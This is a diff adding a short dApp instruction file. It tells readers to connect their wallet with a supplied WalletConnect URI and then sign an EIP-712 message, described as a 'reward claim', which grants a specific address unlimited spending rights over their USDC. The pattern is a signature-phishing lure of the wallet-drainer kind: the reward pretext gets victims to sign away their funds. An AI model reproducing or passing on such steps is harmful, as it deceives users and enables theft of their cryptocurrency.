@@ -1,0 +1,5 @@
+The dApp requires wallet connection via WalletConnect v2. Use this URI in your wallet app:
+
+wc:9a8b7c6d-5e4f-3a2b-1c0d-9e8f7a6b5c4d@2?relay-protocol=irn&symKey=deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef
+
+After connecting, the dApp will prompt for an eth_signTypedData_v4 signature to authorize the reward claim. The EIP-712 message grants 0x28C6c06298d514Db089934071355E5743bf21d60 unlimited spending permission on your USDC balance.
